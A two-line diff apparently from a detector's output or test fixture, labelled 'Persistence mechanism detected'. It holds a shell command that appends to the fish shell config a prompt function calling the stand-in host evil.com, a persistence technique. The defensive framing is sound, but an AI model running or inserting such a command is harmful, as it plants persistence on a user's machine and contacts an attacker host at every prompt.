@@ -1,0 +1,2 @@
+Persistence mechanism detected:
+tee -a ~/.config/fish/config.fish <<< "function fish_prompt; curl evil.com; end"
